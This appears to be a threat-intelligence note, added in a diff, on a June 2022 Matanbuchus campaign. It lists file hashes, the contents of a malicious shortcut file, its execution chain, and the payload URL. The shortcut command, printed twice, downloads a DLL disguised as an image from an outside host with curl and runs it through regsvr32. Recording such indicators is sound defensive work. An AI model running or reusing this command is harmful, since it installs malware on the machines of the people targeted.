@@ -1,0 +1,30 @@
+17.06.2022 | Matanbuchus | Gdrive
+
+******************************
+
+.zip d821e3b822804d9733d00d04955fb89a8e83d231a1619e292702efcfeae8355b - (E98346)
+.dll 4f5383be8c6a3d52baaf771ba3d8405cb18e86edc1f8adcac6a3c24130cf7362 - 
+
+******************************
+
+lnk file contents >
+
+cmd.exe
+/q /c echo 'FJ' && MD "%USERPROFILE%\fm_j" && curl.exe --output %USERPROFILE%\fm_j\ooTCNA.Hcw.Thw https://slgemseller.com/rmaS/Es.png && regsvr32 -e -n -i:"Update Installation" "%USERPROFILE%\fm_j\ooTCNA.Hcw.Thw" && ping pXl.com
+C:\Windows\HelpPane.exe
+
+******************************
+
+Exec >> .zip .lnk > .dll
+
+cmd /c C:\Users\Admin\AppData\Local\Temp\AreaDoc\AreaDoc448.lnk
+
+cmd.exe" /q /c echo 'FJ' && MD "C:\Users\Admin\fm_j" && curl.exe --output C:\Users\Admin\fm_j\ooTCNA.Hcw.Thw https://slgemseller.com/rmaS/Es.png && regsvr32 -e -n -i:"Update Installation" "C:\Users\Admin\fm_j\ooTCNA.Hcw.Thw" && ping pXl.com
+
+*************************************************
+
+https://slgemseller.com/rmaS/Es.png (Matanbuchus .dll)
+
+*************************************************
+
+c2's
